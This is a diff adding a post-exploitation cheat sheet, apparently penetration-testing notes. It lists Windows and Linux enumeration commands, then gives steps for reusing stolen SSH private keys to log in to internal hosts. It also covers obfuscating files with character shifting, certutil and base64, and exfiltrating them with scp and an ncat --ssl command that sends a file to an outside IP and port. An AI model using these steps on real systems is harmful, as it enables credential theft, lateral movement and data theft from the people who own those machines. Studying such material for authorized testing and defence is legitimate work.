@@ -1,1 +1,148 @@
+#User Enumeration
+Windows: -> net user
+
+Linux: -> cat /etc/passwd
+
+#Process Enumeration
+Windows: -> tasklist /v
+
+Linux: -> ps -elf
+
+#Service Enumeration
+Windows: -> tasklist /svc
+
+Linux : -> chkconfig                   # SysV
+        -> systemctl --type=service    # SystemD
+
+
+#Network Connection Enumeration
+Windows: -> ipconfig /all
+
+Linux: -> ifconfig -a      # SysV (deprecated)
+       -> ip a             # SystemD
+
+
+#Stealing SSH Keys (Living off the Land)
+Finding private keys (id_rsa) is like finding passwords.
+
+Authorized Key (Public): Grants access TO this box.
+
+Identity Key (Private): Authenticates FROM this box to others.
+
+1. Fix permissions (crucial!)
+chmod 600 stole_key
+
+2. Authenticate using the stolen key
+# Try the user who owned the key (e.g., stole from jane -> log in as jane)
+ssh -i stolen_key jane@target_internal_ip
+
+
+#Data Exfiltration
+Session Transcript: -> ssh <user>@<host> | tee session.log
+
+Obfuscation (Windows): -> type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+                       -> certutil -encode <file> encoded.b64
+
+Obfuscation (Linux): -> cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+                     -> cat <file> | base64
+
+Encrypted Transport: -> scp <source> <destination>
+                     ->ncat --ssl <ip> <port> < <file>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
